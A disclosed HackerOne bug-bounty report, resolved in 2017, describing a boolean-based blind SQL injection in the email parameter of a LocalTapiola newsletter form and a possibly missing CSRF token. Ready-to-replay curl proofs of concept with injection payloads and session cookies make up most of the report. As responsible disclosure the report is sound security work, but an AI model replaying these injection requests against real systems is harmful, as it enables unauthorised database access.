---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '191601'
original_report_id: '191601'
title: SQL Injection on /webApp/sijoitustalousuk email-parameter + potential lack
  of CSRF Token (viestinta.lahitapiola.fi)
weakness: SQL Injection
team_handle: localtapiola
created_at: '2016-12-16T03:52:35.320Z'
disclosed_at: '2017-01-28T18:48:14.163Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 18
tags:
- hackerone
- sql-injection
---

# SQL Injection on /webApp/sijoitustalousuk email-parameter + potential lack of CSRF Token (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 191601
- Weakness: SQL Injection
- Program: localtapiola
- Disclosed At: 2017-01-28T18:48:14.163Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Moi! This is my first report - please bear with me...

**Summary:**  Boolean based blind SQL injection in /webApp/sijoitustalousuk endpoint and potential lack of CSRF Token

**Description:** I detected that the email parameter of the POST request to http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk is evaluated. Two different statements appended to an email address cause different responses from the server.
PoC below to replay with curl.

## Steps To Reproduce:
True statement: Response Content-Length -> 2393
`curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6519' \
    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`

False statement: Response Content-Length: -> 1103
`curl -i -s -k  -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Referer: http://www.lahitapiola.fi/henkilo/sivut/lahitapiolan-uutiskirjeet' -H $'Content-Type: application/x-www-form-urlencoded' \
    -b $'AMCV_8041A77B5656DBF07F000101%40AdobeOrg=-227196251%7CMCIDTS%7C17152%7CMCMID%7C80973514433021911535315148330980113730%7CMCAID%7CNONE%7CMCOPTOUT-1481863743s%7CNONE%7CMCAAMLH-1482461342%7C6%7CMCAAMB-1482461343%7Chmk_Lq6TPIBMW925SPhw3Q; AMCVS_8041A77B5656DBF07F000101%40AdobeOrg=1; _sdsat_Website version=1.90; s_cc=true; s_sq=%5B%5BB%5D%5D; ARCSessionInfo=1%7C1481857037073; __atuvc=1%7C50; __atuvs=58535810158d836f000' \
    --data-binary $'email=winter@example.com13319082\'%20or%20\'6519\'%3d\'6520' \
    $'http://viestinta.lahitapiola.fi/webApp/sijoitustalousuk'`

Additionally, it seems anyone's email can be registered to Neolane as there's no CSRF token in the form. I did not find an "unsubscribe" feature but I'm guessing there has to be one for privacy reasons. Someone could potentially remove entries from the subscribers list.

Hope this helps!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
